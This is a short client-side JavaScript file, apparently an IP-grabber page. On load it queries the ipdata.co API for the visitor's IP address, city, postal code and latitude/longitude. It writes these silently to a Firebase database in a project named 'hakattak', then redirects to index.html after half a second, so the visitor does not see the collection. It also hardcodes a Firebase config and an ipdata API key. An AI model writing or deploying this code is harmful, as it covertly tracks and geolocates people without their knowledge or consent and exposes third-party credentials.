//import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
const firebaseConfig = {
  apiKey: "AIzaSyDmjog1nfuAAcL9qP7M7vwdnzTWbb5qSpY",
  authDomain: "hakattak-74dea.firebaseapp.com",
  databaseURL: "https://hakattak-74dea-default-rtdb.firebaseio.com",
  projectId: "hakattak-74dea",
  storageBucket: "hakattak-74dea.appspot.com",
  messagingSenderId: "184893472817",
  appId: "1:184893472817:web:801e4e8303d9838f22d510"
};
// Initialize Firebase
const app = firebase.initializeApp(firebaseConfig);

function json(url) {
  return fetch(url).then(res => res.json());
}

let apiKey = "908038e55fe57bc384167442ea51d187bb552793c06c5e7ea5cf0cac";
json(`https://api.ipdata.co?api-key=${apiKey}`).then(data => {
  console.log(data.ip);
  console.log(data.city);
  console.log(data.country_code);
  console.log(data.postal);
  console.log(data.latitude);
  console.log(data.longitude);
  firebase.database().ref("HAkd/" + Math.round(Math.random()*1000)).set({
    city: data.city, 
    country: data.country_code, 
    postal_code: data.postal, 
    ip: data.ip, 
    coords: {
      lat: data.latitude, 
      long: data.longitude
    }
  });
});

setTimeout(() => {window.location.href = "index.html";}, 500)